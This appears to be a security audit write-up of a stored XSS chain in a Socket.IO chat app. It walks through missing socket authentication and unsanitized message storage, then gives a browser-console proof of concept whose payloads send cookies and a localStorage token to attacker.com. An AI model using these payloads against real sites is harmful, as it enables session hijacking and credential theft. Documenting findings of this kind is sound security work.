Stored XSS Attack Chain

Demonstrates how an unauthenticated attacker can inject malicious HTML into the chat database via the Socket.IO endpoint, which is then executed in every recipient's browser.

Attack Chain

VULN-01 + VULN-03 / VULN-04
1
Attacker opens a raw Socket.IO connection — no authentication required.
VULN-01 Socket endpoint has no verifyToken middleware.
2
Attacker emits sendMessage with an XSS payload as content, and any senderId they choose.
3
Server saves the raw payload to the database via prisma.message.create() — no sanitization.
4
Server broadcasts the poisoned message via io.to(...).emit('receiveMessage') to all connected rooms.
5
React renders msg.content in AdminMainArea.tsx:105 and ChatMainArea.tsx:77. The HTML is inserted into the DOM.
VULN-03 VULN-04
6
XSS fires in the Admin's browser. Attacker can steal session cookies, perform actions as Admin, or exfiltrate data.
⚡ Note on React: JSX normally escapes text, BUT if the code were refactored to use dangerouslySetInnerHTML (e.g., to render markdown), this becomes a direct, immediate XSS with no other prerequisites. The PoC below simulates this exact scenario.

Attacker Script

Run in browser console — no login needed
// 1. Connect — no auth needed
const socket = io('http://localhost:3000', {
  withCredentials: true
});

// 2. Inject XSS payload
socket.emit('sendMessage', {
  senderId: 1,         // Spoofed — any userId
  receiverId: 2,
  content:
    '<img src=x ' +
    'onerror="fetch(`https://attacker.com/steal?` + ' +
    'document.cookie)">'
});

// 3. Or steal localStorage data:
socket.emit('sendMessage', {
  senderId: 1,
  receiverId: 2,
  content:
    '<script>' +
    'new Image().src="https://attacker.com/" +' +
    'localStorage.getItem("token")' +
    '</script>'
});
